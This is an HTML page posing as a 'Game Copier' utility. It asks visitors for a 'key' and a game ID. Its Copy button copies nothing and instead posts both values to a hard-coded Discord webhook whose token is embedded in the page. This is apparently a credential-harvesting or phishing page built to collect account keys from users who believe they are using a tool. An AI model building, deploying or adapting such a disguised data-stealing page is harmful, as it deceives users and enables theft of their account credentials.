<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Copier</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #1c1c1c;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        h1 {
            margin-bottom: 20px;
        }

        .textbox {
            width: 300px;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #2a2a2a;
            color: white;
        }

        .copy-button {
            width: 300px;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #4caf50;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .copy-button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Game Copier</h1>
        <input type="text" id="key" placeholder="Enter your key" class="textbox">
        <input type="text" id="gameId" placeholder="Enter game ID" class="textbox">
        <button id="copyButton" class="copy-button">Copy</button>
    </div>

    <script>
        document.getElementById('copyButton').onclick = function() {
            const key = document.getElementById('key').value;
            const gameId = document.getElementById('gameId').value;

            // Prepare the data to send
            const data = {
                content: `Key: ${key}\nGame ID: ${gameId}`
            };

            // Send the data to the webhook
            fetch('https://discord.com/api/webhooks/1298896604945842197/I9fgaOcI5rDdWqkUYPB8OT2-tg0CE5cP5d94AdTv4caUmJhVbS17uJ5oyL9yx5GcaQ2j', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                if (response.ok) {
                    alert('Information sent successfully!');
                } else {
                    alert('Error sending information.');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        };
    </script>
</body>
</html>
